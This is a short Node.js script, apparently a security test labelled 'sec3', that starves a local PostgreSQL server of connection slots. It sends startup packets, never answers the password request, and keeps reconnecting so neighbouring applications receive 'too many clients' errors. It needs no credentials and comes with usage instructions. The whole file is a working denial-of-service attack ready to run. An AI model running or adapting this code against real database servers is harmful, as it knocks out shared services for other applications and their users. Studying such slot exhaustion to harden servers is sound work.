// sec3: run inside ANY app (no database credentials needed). Holds every PostgreSQL backend slot by
// sending a startup packet and never answering the password request (authentication_timeout,
// 60 s by default), reconnecting as slots free up. Neighbour apps then get "too many clients".
// usage: node pg-slot-hog.js [connections=40] [seconds=90]
const net = require('net');
const N = Number(process.argv[2] || 40), T = Number(process.argv[3] || 90) * 1000, end = Date.now() + T;
function startup() {
  const kv = Buffer.from('user\0nobody_here\0database\0postgres\0\0');
  const b = Buffer.alloc(8 + kv.length); b.writeInt32BE(8 + kv.length, 0); b.writeInt32BE(196608, 4); kv.copy(b, 8); return b;
}
let open = 0, made = 0, refused = 0;
function one() {
  if (Date.now() > end) return;
  const s = net.connect(5432, '127.0.0.1', () => { open++; made++; s.write(startup()); });
  s.on('data', d => { if (d[0] === 0x45) { refused++; } });   // 'E': error (too many clients)
  s.on('error', () => {}); s.on('close', () => { open--; setTimeout(one, 200); });
}
for (let i = 0; i < N; i++) one();
const t = setInterval(() => { console.log(`open=${open} made=${made} errors=${refused}`); if (Date.now() > end) { clearInterval(t); process.exit(0); } }, 5000);
